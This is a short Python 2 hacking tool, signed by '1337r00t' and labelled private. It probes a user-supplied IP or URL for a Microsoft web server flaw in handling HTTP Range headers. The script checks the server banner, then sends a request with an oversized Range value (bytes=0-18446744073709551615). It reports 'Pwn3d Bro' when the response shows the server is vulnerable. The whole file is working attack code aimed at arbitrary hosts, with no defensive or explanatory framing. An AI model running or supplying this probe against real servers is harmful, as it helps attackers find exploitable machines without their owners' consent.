import socket
import random
print '''
################################
#
# This Tool Priv8
#
# Coded By 1337r00t
#
################################
'''
ip = raw_input("[+] Enter (IP-URL) : ")
hexAllFfff = "18446744073709551615"
req1 = "GET / HTTP/1.0\r\n\r\n"
req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"
print "[*] Audit Started"
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ip, 80))
client_socket.send(req1)
Report = client_socket.recv(1024)
if "Microsoft" not in Report:
                print "[-] Not Vuln [-]"
                exit(0)
client_socket.close()
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ip, 80))
client_socket.send(req)
vuln = client_socket.recv(1024)
if "Requested Range Not Satisfiable" in vuln:
                print "[+] Pwn3d Bro %s [+]" %(ip)
elif " The request has an invalid header name" in vuln:
                print "[*] Ammm Check %s [*]" %(ip)
else:
                print "[-] Failed [-]"
